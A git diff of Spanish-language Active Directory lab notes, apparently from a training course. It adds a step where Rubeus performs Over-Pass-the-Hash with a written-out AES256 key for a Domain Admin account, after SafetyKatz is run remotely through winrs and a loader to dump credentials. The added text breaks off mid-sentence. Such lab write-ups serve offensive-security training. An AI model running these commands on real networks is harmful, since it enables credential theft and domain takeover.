@@ -117,5 +117,12 @@ Para poder ejecutar ahora *SafetyKatz* en *dcorp-mgmt*, lo descagamos y ejecutam
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-Dandonos como respuesta las credenciales del *svcadmin* que es Domain Admin
-Al ser esta una cuenta de servicio que se puede saber al ver que pone 
+Dándonos como respuesta las credenciales del *svcadmin* que es Domain Admin
+
+A continuación usaremos la técnica de *OverPAss-The_Hash* para obtener las credenciales de *svcadmin*
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+winrs -r:dcorp-dc cmd /c set username
+```
+
+ Este comando lo que hace es a traves del *Loader* que tenemos ejecutado en la maquina victima ejecutar *Rubeus* solicitando un *TGT* con un usuario en este caso **
